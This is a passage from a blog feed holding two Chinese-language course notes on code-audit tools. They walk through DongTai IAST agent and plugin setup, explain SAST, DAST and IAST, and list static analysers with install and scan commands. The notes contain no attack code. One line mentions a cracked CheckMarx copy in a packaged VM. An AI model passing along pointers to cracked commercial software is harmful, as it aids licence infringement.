href="https://labs.iast.huoxian.cn/#/images/index">https://labs.iast.huoxian.cn/#/images/index</a></p><p>主要测评：应用漏洞&amp;组件安全</p><p>在线靶场测评：openrasp&amp;spring</p><p>本地应用测评：IDEA_Plugin插件</p><p>Agent部署测评：DongTai OpenApi</p><h5 id="1、IDEA-Plugin插件"><a href="#1、IDEA-Plugin插件" class="headerlink" title="1、IDEA_Plugin插件"></a>1、IDEA_Plugin插件</h5><p><a href="https://github.com/HXSecurity/DongTai-Plugin-IDEA/releases">https://github.com/HXSecurity/DongTai-Plugin-IDEA/releases</a></p><p><a href="https://doc.dongtai.io/docs/getting-started/agent/plugin/java-agent-idea">https://doc.dongtai.io/docs/getting-started/agent/plugin/java-agent-idea</a></p><h6 id="下载之后"><a href="#下载之后" class="headerlink" title="下载之后"></a>下载之后</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414152901729.png" alt="image-20230414152901729"></p><h6 id="配置云端"><a href="#配置云端" class="headerlink" title="配置云端"></a>配置云端</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414153220551.png" alt="image-20230414153220551"></p><h6 id="改这两个地方"><a href="#改这两个地方" class="headerlink" title="改这两个地方"></a>改这两个地方</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154132505.png" alt="image-20230414154132505"></p><h6 id="点击启动"><a href="#点击启动" class="headerlink" title="点击启动"></a>点击启动</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154245064.png" alt="image-20230414154245064"></p><h6 id="如果成功会提示"><a href="#如果成功会提示" class="headerlink" title="如果成功会提示"></a>如果成功会提示</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154307945.png" alt="image-20230414154307945"></p><h6 id="启动之后可以看到洞态里面自动新建了相应的项目"><a href="#启动之后可以看到洞态里面自动新建了相应的项目" class="headerlink" title="启动之后可以看到洞态里面自动新建了相应的项目"></a>启动之后可以看到洞态里面自动新建了相应的项目</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154611069.png" alt="image-20230414154611069"></p><h6 id="本地在网站里面随意地方点加载数据包"><a href="#本地在网站里面随意地方点加载数据包" class="headerlink" title="本地在网站里面随意地方点加载数据包"></a>本地在网站里面随意地方点加载数据包</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154848951.png" alt="image-20230414154848951"></p><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414155045764.png" alt="image-20230414155045764"></p><h6 id="这里开启以后就不用自己去主动访问网站，它会自动全局扫描"><a href="#这里开启以后就不用自己去主动访问网站，它会自动全局扫描" class="headerlink" title="这里开启以后就不用自己去主动访问网站，它会自动全局扫描"></a>这里开启以后就不用自己去主动访问网站，它会自动全局扫描</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414155247690.png" alt="image-20230414155247690"></p><h5 id="2、Agent部署"><a href="#2、Agent部署" class="headerlink" title="2、Agent部署"></a>2、Agent部署</h5><p><a href="https://doc.dongtai.io/docs/category/agent-%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">https://doc.dongtai.io/docs/category/agent-%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97</a></p><h6 id="刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错"><a href="#刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错" class="headerlink" title="刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错"></a>刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414161002086.png" alt="image-20230414161002086"></p><h6 id="所以要部署Agent"><a href="#所以要部署Agent" class="headerlink" title="所以要部署Agent"></a>所以要部署Agent</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414160257783.png" alt="image-20230414160257783"></p><h6 id="下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL-所以关闭新版，启动之前的老版本"><a href="#下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL-所以关闭新版，启动之前的老版本" class="headerlink" title="下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL,所以关闭新版，启动之前的老版本"></a>下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL,所以关闭新版，启动之前的老版本</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414161512571.png" alt="image-20230414161512571"></p><h6 id="再次启动运行成功"><a href="#再次启动运行成功" class="headerlink" title="再次启动运行成功"></a>再次启动运行成功</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414161755845.png" alt="image-20230414161755845"></p><h6 id="因为需要获取对应端口的PID号，这里是8088，输入命令查看"><a href="#因为需要获取对应端口的PID号，这里是8088，输入命令查看" class="headerlink" title="因为需要获取对应端口的PID号，这里是8088，输入命令查看"></a>因为需要获取对应端口的PID号，这里是8088，输入命令查看</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162058118.png" alt="image-20230414162058118"></p><h6 id="提示成功，等待即可"><a href="#提示成功，等待即可" class="headerlink" title="提示成功，等待即可"></a>提示成功，等待即可</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162146393.png" alt="image-20230414162146393"></p><h6 id="打开洞态，显示自动新增了刚才的项目"><a href="#打开洞态，显示自动新增了刚才的项目" class="headerlink" title="打开洞态，显示自动新增了刚才的项目"></a>打开洞态，显示自动新增了刚才的项目</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162328959.png" alt="image-20230414162328959"></p><h6 id="检测到了SQL注入等"><a href="#检测到了SQL注入等" class="headerlink" title="检测到了SQL注入等"></a>检测到了SQL注入等</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162447670.png" alt="image-20230414162447670"></p><h6 id="对于php低版本不友好"><a href="#对于php低版本不友好" class="headerlink" title="对于php低版本不友好"></a>对于php低版本不友好</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162809481.png" alt="image-20230414162809481"></p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h4 id="代码审计利器-IAST-SemmleQL测评报告"><a href="#代码审计利器-IAST-SemmleQL测评报告" class="headerlink" title="#代码审计利器-IAST-SemmleQL测评报告"></a>#代码审计利器-IAST-SemmleQL测评报告</h4><p><a href="https://lgtm.com/">https://lgtm.com/</a> 代码平台接入测评</p><p>测评：<a href="https://lgtm.com/">https://lgtm.com/</a></p><h4 id="补充说明："><a href="#补充说明：" class="headerlink" title="#补充说明："></a>#补充说明：</h4><p>目前免费可试用的四个IAST平台：</p><p><strong>1、openrasp-iastopenrasp-iast</strong> 是一款灰盒扫描工具，目前开源的IAST扫描器，通过安装Agent和扫描器，能够结合应用内部hook点信息，针对获取到的url请求参数进行fuzz，从而检测到安全漏洞。</p><p>支持的编程语言：<code>Java、PHP。</code></p><p><strong>2、VulHunte</strong>r检测原理是通过在应用程序的字节码中动态插桩检测“探针”，来获取应用程序运行时的各种上下文信息。在应用程序运行时，实时分析程序的安全弱点。与基于SAST和DAST技术的产品相比，VulHunter的最大不同点是，通过字节码插桩应用程序获得更多准确的运行时信息。</p><p>支持的编程语言：<code>java、node.js。</code></p><p><strong>3、火线~洞态IAST洞态IAST提供SAAS平台</strong>，个人用户通过填写问卷注册登录，下载Agent进行应用程序部署，正常访问应用，就可以触发漏洞检测。漏洞结果提供比较详细的HTTP数据包和污点流图，可用于快速验证和复现漏洞。</p><p>支持的编程语言：<code>Java、PHP，Python，Go。</code></p><p><strong>4、Semmle QLSemmle</strong>公司声称以一种独特的方法寻找代码中的漏洞。技术核心是把代码当成数据，将分析问题变成对数据库的请求。SemmleQL是一个声明式的面向对象的查询语言。</p><p>支持的编程语言：<code>Java，JavaScript，Python，TypeScript，C＃，Go，C/C ++</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、代码审计-开源版&amp;amp;商业版&lt;/p&gt;
&lt;p&gt;2、代码审计-单语言&amp;amp;多语言&lt;/p&gt;
&lt;p&gt;3、代码审计-D</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>Day95 代码审计-SAST&amp;IAST项目&amp;PHP&amp;Java&amp;NET&amp;Python&amp;Js&amp;Go等测评</title>
    <link href="http://example.com/2023/04/11/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/"/>
    <id>http://example.com/2023/04/11/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/</id>
    <published>2023-04-11T02:19:26.000Z</published>
    <updated>2023-04-14T09:41:05.962Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、代码审计-开源版&amp;商业版</p><p>2、代码审计-单语言&amp;多语言</p><p>3、代码审计-DAST&amp;SAST&amp;IAST</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p><a href="https://xz.aliyun.com/t/7945">https://xz.aliyun.com/t/7945</a>   java代码审计常规思路和方法.pdf</p><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/Qu9rvdL1uVm46pnMkdIKKw.png" alt="img"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/1KVCYs7pMFhVOkRfle1BnA.png" alt="img"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/1KVCYs7pMFhVOkRfle1BnA.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-代码审计利器-SAST-单语言"><a href="#➢-代码审计利器-SAST-单语言" class="headerlink" title="➢ 代码审计利器-SAST-单语言"></a>➢ 代码审计利器-SAST-单语言</h4><h4 id="➢-代码审计利器-SAST-多语言"><a href="#➢-代码审计利器-SAST-多语言" class="headerlink" title="➢ 代码审计利器-SAST-多语言"></a>➢ 代码审计利器-SAST-多语言</h4></blockquote><p>DAST&amp;SAST&amp;IAST</p><p>DAST：动态应用程序安全测试（Dynamic Application Security Testing）技术在测试或运行阶段分析应用程序的动态运行状态。它模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定该Web应用是否易受攻击。</p><p>SAST：静态应用程序安全测试（Static Application Security Testing）技术通常在编码阶段分析应用程序的源代码或二进制文件的语法、结构、过程、接口等来发现程序代码存在的安全漏洞。</p><p>IAST：交互式应用程序安全测试（Interactive Application Security Testing）是2012年Gartner公司提出的一种新的应用程序安全测试方案，通过代理、VPN或者在服务端部署Agent程序，收集、监控Web应用程序运行时函数执行、数据传输，并与扫描器端进行实时交互，高效、准确的识别安全缺陷及漏洞，同时可准确确定漏洞所在的代码文件、行数、函数及参数。IAST相当于是DAST和SAST结合的一种互相关联运行时安全检测技术。</p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414151639258.png" alt="image-20230414151639258"></p><p>目前还有些商业版平台未介绍如下：</p><p>静态：CheckMarx 奇安信代码卫士等</p><p>IAST：悬镜灵脉IAST 默安雳鉴IAST等</p><p><strong>PHP</strong> -Seay RIPS <strong>CheckMarx Fortify</strong>（这两款占用cpu较大，不建议本机使用） VCG Kunlun-M</p><p><strong>NET</strong> -VCG Fortify CheckMarx</p><p><strong>Java</strong>-Fortify Fortify CheckMarx</p><p><strong>Python</strong>-Bandit Fortify CheckMarx</p><p><strong>JS</strong>-Kunlun-M NodeJsScan Fortify CheckMarx</p><p><strong>Go</strong>-Gosec CheckMarx</p><h4 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h4><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414143726848.png" alt="image-20230414143726848"></p><p>参考：<a href="https://bandit.readthedocs.io/">https://bandit.readthedocs.io/</a></p><p>安装：pip install bandit</p><h5 id="linux"><a href="#linux" class="headerlink" title="linux:"></a>linux:</h5><p>安装后会在当前Python目录下bin</p><p>使用：bandit -r 需要审计的源码目录</p><h5 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h5><p>安装后会在当前Python目录下script</p><p>使用：bandit -r 需要审计的源码目录</p><p>D:\Python3\Scripts&gt;bandit.exe -r F:\python_webapp\www\</p><h4 id="Kunlun-M"><a href="#Kunlun-M" class="headerlink" title="Kunlun-M"></a>Kunlun-M</h4><p>1、安装依赖库：pip install -r requirements.txt</p><p>2、配置文件启用：cp Kunlun_M&#x2F;settings.py.bak Kunlun_M&#x2F;settings.py</p><p>3、初始化数据库：python kunlun.py init initialize</p><p>4、加载规则数据库：python kunlun.py config load</p><p>Web使用：D:\Python38\python.exe kunlun.py web -p 9999</p><p>Cli使用：D:\Python38\python.exe kunlun.py scan -t D:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;xhcms</p><h4 id="Gosec"><a href="#Gosec" class="headerlink" title="Gosec"></a>Gosec</h4><p>curl -sfL <a href="https://raw.githubusercontent.com/securego/gosec/master/install.sh">https://raw.githubusercontent.com/securego/gosec/master/install.sh</a> | sh -s – -b $(go env GOPATH)&#x2F;bin v2.12.0</p><p>gosec -fmt&#x3D;json -out&#x3D;results.json .&#x2F;…</p><p><strong>VCG</strong> </p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414142159413.png" alt="image-20230414142159413"></p><p><strong>CheckMarx</strong> （<strong>会追踪参数调用过程</strong>）</p><h5 id="这里只有这个打包的虚拟机里面有破解的"><a href="#这里只有这个打包的虚拟机里面有破解的" class="headerlink" title="这里只有这个打包的虚拟机里面有破解的"></a>这里只有这个打包的虚拟机里面有破解的</h5><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414141509127.png" alt="image-20230414141509127"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414142516597.png" alt="image-20230414142516597"></p><p><strong>Fortify</strong></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414133629131.png" alt="image-20230414133629131"></p><p><strong>1、</strong><a href="https://github.com/securego/gosec">https://github.com/securego/gosec</a>   Go</p><p><strong>2、</strong><a href="https://github.com/FeeiCN/Cobra">https://github.com/FeeiCN/Cobra</a> 多语言</p><p><strong>3、</strong><a href="https://github.com/LoRexxar/Kunlun-M">https://github.com/LoRexxar/Kunlun-M</a> PHP&amp;Js</p><h5 id="文档生成"><a href="#文档生成" class="headerlink" title="文档生成"></a>文档生成</h5><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132722567.png" alt="image-20230414132722567"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414120035899.png" alt="image-20230414120035899"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132747346.png" alt="image-20230414132747346"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414133137102.png" alt="image-20230414133137102"></p><h6 id="使用web界面显示"><a href="#使用web界面显示" class="headerlink" title="使用web界面显示"></a>使用web界面显示</h6><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132454822.png" alt="image-20230414132454822"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132534965.png" alt="image-20230414132534965"></p><p><strong>4、</strong><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a> Ruby</p><p><strong>5、</strong><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a> JS框架</p><p><strong>6、</strong><a href="https://github.com/PyCQA/bandit/releases">https://github.com/PyCQA/bandit/releases</a> Python</p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414114357179.png" alt="image-20230414114357179"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、代码审计-开源版&amp;amp;商业版&lt;/p&gt;
&lt;p&gt;2、代码审计-单语言&amp;amp;多语言&lt;/p&gt;
&lt;p&gt;3、代码审计-D</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
</feed>
